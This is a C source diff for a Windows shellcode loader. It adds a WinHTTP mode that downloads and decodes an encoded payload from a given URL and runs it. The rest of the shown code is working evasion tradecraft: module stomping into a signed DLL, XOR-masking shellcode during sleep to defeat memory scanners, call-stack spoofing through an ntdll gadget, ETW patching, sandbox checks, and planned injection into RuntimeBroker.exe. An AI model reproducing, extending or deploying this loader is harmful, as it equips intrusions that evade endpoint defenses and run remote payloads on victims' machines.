@@ -48,6 +48,18 @@ typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE,BOOLEAN,PLARGE_INTEGER);
 typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
 typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG,PVOID,ULONG,PULONG);
 
+/* ─── WinHTTP function pointer types (dynamic load, no winhttp.h required) ─── */
+typedef void*    HINTERNET;
+typedef HINTERNET(WINAPI *pWHOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+typedef HINTERNET(WINAPI *pWHConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
+typedef HINTERNET(WINAPI *pWHOpenReq)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+typedef BOOL     (WINAPI *pWHSend)(HINTERNET,LPCWSTR,DWORD,PVOID,DWORD,DWORD,ULONG_PTR);
+typedef BOOL     (WINAPI *pWHRecv)(HINTERNET,PVOID);
+typedef BOOL     (WINAPI *pWHQAvail)(HINTERNET,LPDWORD);
+typedef BOOL     (WINAPI *pWHRead)(HINTERNET,PVOID,DWORD,LPDWORD);
+typedef BOOL     (WINAPI *pWHClose)(HINTERNET);
+typedef BOOL     (WINAPI *pWHCrack)(LPCWSTR,DWORD,DWORD,PVOID);
+
 /* ─── Junk padding (compiler keeps these; runners differ structurally per build) ─── */
 static int POLY_JUNK1(int x){ return x * POLY_CONST1 + POLY_CONST2; }
 static int POLY_JUNK2(int a, int b){ int c = a ^ b; return c + POLY_CONST3; }
@@ -386,21 +398,23 @@ static PBYTE POLY_MODSTOMP(SIZE_T needed) {
     return NULL;
 }
 
-/* ─── Self-injection: module stomp → XOR sleep → stack spoof → named pipe capture ─── */
-static void POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
+/* ─── Self-injection: module stomp → XOR sleep → stack spoof → pipe capture ─── */
+/* Returns: 0=success, 14=memory alloc fail, 15=thread create fail              */
+static int POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
+    /* Prefer module stomping (.text of signed DLL) over anonymous RX alloc */
     PBYTE exec_base = POLY_MODSTOMP(sclen);
-    BOOL stomped = (exec_base != NULL);
-    if (!stomped) {
+    if (!exec_base) {
         PVOID base = NULL; SIZE_T sz = sclen;
-        POLY_NTALLOC(GetCurrentProcess(), &base, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-        if (!base) return;
+        POLY_NTALLOC(GetCurrentProcess(), &base, 0, &sz,
+                     MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if (!base) return 14;
         exec_base = (PBYTE)base;
     }
 
     SIZE_T w = 0;
     POLY_NTWRITE(GetCurrentProcess(), exec_base, sc, sclen, &w);
 
-    /* XOR-encrypt during sleep: scanner sees garbage */
+    /* XOR-encrypt during sleep: in-memory scanner sees garbage */
     BYTE xkey = (BYTE)(GetTickCount() & 0xFE) | 1;
     for (SIZE_T i = 0; i < sclen; i++) exec_base[i] ^= xkey;
     Sleep(2000 + (GetTickCount() % 3000));
@@ -409,18 +423,8 @@ static void POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
     DWORD oldProt;
     VirtualProtect(exec_base, sclen, PAGE_EXECUTE_READ, &oldProt);
 
-    /* Named pipe: capture .NET Console output from donut payloads */
-    HANDLE hPipeR = INVALID_HANDLE_VALUE, hPipeW = INVALID_HANDLE_VALUE;
-    HANDLE hOrigOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    HANDLE hOrigErr = GetStdHandle(STD_ERROR_HANDLE);
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-    if (CreatePipe(&hPipeR, &hPipeW, &sa, 65536)) {
-        SetHandleInformation(hPipeR, HANDLE_FLAG_INHERIT, 0);
-        SetStdHandle(STD_OUTPUT_HANDLE, hPipeW);
-        SetStdHandle(STD_ERROR_HANDLE,  hPipeW);
-    }
-
-    /* Stack spoof: thread start = ntdll jmp rcx gadget, arg (rcx) = shellcode */
+    /* Stack spoof: start thread at ntdll jmp-rcx gadget, rcx = shellcode base.
+     * Shellcode Console.Write flows directly to r.exe stdout (WinRM captures it). */
     PBYTE gadget = POLY_FINDGADGET(POLY_NTDLL);
     PVOID tstart = gadget ? (PVOID)gadget   : (PVOID)exec_base;
     PVOID targ   = gadget ? (PVOID)exec_base : NULL;
@@ -428,55 +432,130 @@ static void POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
     HANDLE hThread = NULL;
     POLY_NTTHREAD(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
                   tstart, targ, 0, 0, 0x200000, 0x200000, NULL);
-    if (hThread) { POLY_NTWAIT(hThread, FALSE, NULL); POLY_NTCLOSE(hThread); }
+    if (!hThread) return 15;
 
-    if (hPipeW != INVALID_HANDLE_VALUE) {
-        CloseHandle(hPipeW);
-        SetStdHandle(STD_OUTPUT_HANDLE, hOrigOut);
-        SetStdHandle(STD_ERROR_HANDLE,  hOrigErr);
-    }
-    if (hPipeR != INVALID_HANDLE_VALUE) {
-        BYTE buf[4096]; DWORD n;
-        while (ReadFile(hPipeR, buf, sizeof(buf), &n, NULL) && n > 0)
-            WriteFile(hOrigOut, buf, n, &n, NULL);
-        CloseHandle(hPipeR);
-    }
-    (void)stomped;
+    POLY_NTWAIT(hThread, FALSE, NULL);
+    POLY_NTCLOSE(hThread);
+    return 0;
 }
 
 /* ─── Load + XOR-decrypt shellcode from .enc file (no crypt32, no stdio) ─── */
-static PBYTE POLY_LOADENC(LPCSTR path, SIZE_T *sclen) {
-    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
-                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h == INVALID_HANDLE_VALUE) return NULL;
-    DWORD fsz = GetFileSize(h, NULL);
-    if (fsz == INVALID_FILE_SIZE || fsz == 0) { CloseHandle(h); return NULL; }
-
-    PBYTE raw = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fsz + 2);
-    if (!raw) { CloseHandle(h); return NULL; }
-    DWORD rd = 0;
-    ReadFile(h, raw, fsz, &rd, NULL);
-    CloseHandle(h);
-    raw[fsz] = raw[fsz+1] = 0;
-
-    /* Inline base64 decode: two-pass (size, then decode) */
-    DWORD blen = ks_b64dec(raw, fsz, NULL);
+/* ─── Decode .enc bytes (base64 → XOR): shared by local and remote load ─── */
+static PBYTE ks_decenc(PBYTE raw, DWORD rawlen, SIZE_T *sclen) {
+    if (!raw || rawlen < 2) return NULL;
+    raw[rawlen] = raw[rawlen+1] = 0;
+    DWORD blen = ks_b64dec(raw, rawlen, NULL);
     PBYTE blob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, blen + 1);
-    if (!blob) { HeapFree(GetProcessHeap(), 0, raw); return NULL; }
-    ks_b64dec(raw, fsz, blob);
-    HeapFree(GetProcessHeap(), 0, raw);
-
+    if (!blob) return NULL;
+    ks_b64dec(raw, rawlen, blob);
     if (blen < 2) { HeapFree(GetProcessHeap(), 0, blob); return NULL; }
-
-    /* First byte = XOR key; remainder = XOR-encrypted shellcode */
     BYTE key = blob[0];
     DWORD slen = blen - 1;
     PBYTE sc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, slen);
     if (!sc) { HeapFree(GetProcessHeap(), 0, blob); return NULL; }
     for (DWORD i = 0; i < slen; i++) sc[i] = blob[i+1] ^ key;
     HeapFree(GetProcessHeap(), 0, blob);
-
     *sclen = slen;
+    return sc;
+}
+
+static PBYTE POLY_LOADENC(LPCSTR path, SIZE_T *sclen) {
+    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return NULL;
+    DWORD fsz = GetFileSize(h, NULL);
+    if (fsz == INVALID_FILE_SIZE || fsz == 0) { CloseHandle(h); return NULL; }
+    PBYTE raw = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fsz + 2);
+    if (!raw) { CloseHandle(h); return NULL; }
+    DWORD rd = 0;
+    ReadFile(h, raw, fsz, &rd, NULL);
+    CloseHandle(h);
+    PBYTE sc = ks_decenc(raw, fsz, sclen);
+    HeapFree(GetProcessHeap(), 0, raw);
+    return sc;
+}
+
+/* ─── WinHTTP remote fetch: downloads URL to heap buffer ─── */
+static PBYTE POLY_HTTPGET(LPCSTR url_a, SIZE_T *sclen) {
+    /* Convert ASCII URL to wide */
+    int wsz = MultiByteToWideChar(CP_ACP, 0, url_a, -1, NULL, 0);
+    if (wsz <= 0) return NULL;
+    WCHAR *wurl = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wsz * sizeof(WCHAR));
+    if (!wurl) return NULL;
+    MultiByteToWideChar(CP_ACP, 0, url_a, -1, wurl, wsz);
+
+    HMODULE hWH = LoadLibraryA("winhttp.dll");
+    if (!hWH) { HeapFree(GetProcessHeap(), 0, wurl); return NULL; }
+
+    pWHOpen    fnOpen  = (pWHOpen)   GetProcAddress(hWH, "WinHttpOpen");
+    pWHConnect fnConn  = (pWHConnect)GetProcAddress(hWH, "WinHttpConnect");
+    pWHOpenReq fnReq   = (pWHOpenReq)GetProcAddress(hWH, "WinHttpOpenRequest");
+    pWHSend    fnSend  = (pWHSend)   GetProcAddress(hWH, "WinHttpSendRequest");
+    pWHRecv    fnRecv  = (pWHRecv)   GetProcAddress(hWH, "WinHttpReceiveResponse");
+    pWHQAvail  fnAvail = (pWHQAvail) GetProcAddress(hWH, "WinHttpQueryDataAvailable");
+    pWHRead    fnRead  = (pWHRead)   GetProcAddress(hWH, "WinHttpReadData");
+    pWHClose   fnClose = (pWHClose)  GetProcAddress(hWH, "WinHttpCloseHandle");
+
+    if (!fnOpen||!fnConn||!fnReq||!fnSend||!fnRecv||!fnAvail||!fnRead||!fnClose) {
+        FreeLibrary(hWH); HeapFree(GetProcessHeap(), 0, wurl); return NULL;
+    }
+
+    /* Parse host:port and path from URL (http://host:port/path) */
+    WCHAR host[256]; host[0] = 0; WORD port = 80; WCHAR path[1024]; path[0] = 0;
+    WCHAR *p = wurl;
+    if (p[0]=='h'&&p[1]=='t'&&p[2]=='t'&&p[3]=='p'&&p[4]==':'&&p[5]=='/'&&p[6]=='/') p += 7;
+    WCHAR *slash = p;
+    while (*slash && *slash != L'/' && *slash != L':') slash++;
+    DWORD hlen = (DWORD)(slash - p);
+    if (hlen >= 256) hlen = 255;
+    for (DWORD i = 0; i < hlen; i++) host[i] = p[i];
+    host[hlen] = 0;
+    if (*slash == L':') {
+        slash++;
+        WORD n = 0;
+        while (*slash >= L'0' && *slash <= L'9') { n = (WORD)(n*10 + (*slash++ - L'0')); }
+        if (n) port = n;
+    }
+    if (*slash) {
+        DWORD pl = 0;
+        while (slash[pl] && pl < 1023) { path[pl] = slash[pl]; pl++; }
+        path[pl] = 0;
+    } else {
+        path[0] = L'/'; path[1] = 0;
+    }
+    HeapFree(GetProcessHeap(), 0, wurl);
+
+    HINTERNET hSess = fnOpen(L"Mozilla/5.0", 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
+    if (!hSess) { FreeLibrary(hWH); return NULL; }
+    HINTERNET hConn = fnConn(hSess, host, port, 0);
+    if (!hConn) { fnClose(hSess); FreeLibrary(hWH); return NULL; }
+    HINTERNET hReq  = fnReq(hConn, L"GET", path, NULL, NULL, NULL, 0);
+    if (!hReq)  { fnClose(hConn); fnClose(hSess); FreeLibrary(hWH); return NULL; }
+
+    if (!fnSend(hReq, NULL, 0, NULL, 0, 0, 0) || !fnRecv(hReq, NULL)) {
+        fnClose(hReq); fnClose(hConn); fnClose(hSess); FreeLibrary(hWH); return NULL;
+    }
+
+    /* Read response into growing heap buffer */
+    PBYTE buf = NULL; DWORD total = 0;
+    for (;;) {
+        DWORD avail = 0;
+        if (!fnAvail(hReq, &avail) || avail == 0) break;
+        PBYTE tmp = (PBYTE)HeapAlloc(GetProcessHeap(), 0, total + avail + 2);
+        if (!tmp) break;
+        if (buf) { for (DWORD i=0;i<total;i++) tmp[i]=buf[i]; HeapFree(GetProcessHeap(),0,buf); }
+        buf = tmp;
+        DWORD rd = 0;
+        if (!fnRead(hReq, buf + total, avail, &rd) || rd == 0) break;
+        total += rd;
+    }
+    fnClose(hReq); fnClose(hConn); fnClose(hSess); FreeLibrary(hWH);
+
+    if (!buf || total == 0) { if (buf) HeapFree(GetProcessHeap(), 0, buf); return NULL; }
+
+    /* Decode the downloaded .enc bytes */
+    PBYTE sc = ks_decenc(buf, total, sclen);
+    HeapFree(GetProcessHeap(), 0, buf);
     return sc;
 }
 
@@ -517,20 +596,22 @@ static int ks_run(int argc, char *argv[]) {
     if (argc < 3 ||
         (ks_streq(argv[1],"-local")  != 0 &&
          ks_streq(argv[1],"-remote") != 0)) {
-        return 1;
+        return 11;
     }
 
-    if (POLY_SANDBOX()) return 0;
-    if (!POLY_INITSTUB()) return 1;
+    if (!POLY_INITSTUB()) return 12;   /* stubs must be ready before any KS_STUB() call */
     POLY_PATCHETW();
+    if (POLY_SANDBOX()) return 0;
 
     SIZE_T sclen = 0;
     PBYTE sc = NULL;
 
     if (ks_streq(argv[1], "-local") == 0)
         sc = POLY_LOADENC(argv[2], &sclen);
+    else if (ks_streq(argv[1], "-remote") == 0)
+        sc = POLY_HTTPGET(argv[2], &sclen);
 
-    if (!sc || sclen == 0) return 1;
+    if (!sc || sclen == 0) return 13;
 
     /* Injection priority:
      * 1. RuntimeBroker.exe (always running, user-context, Microsoft-signed)
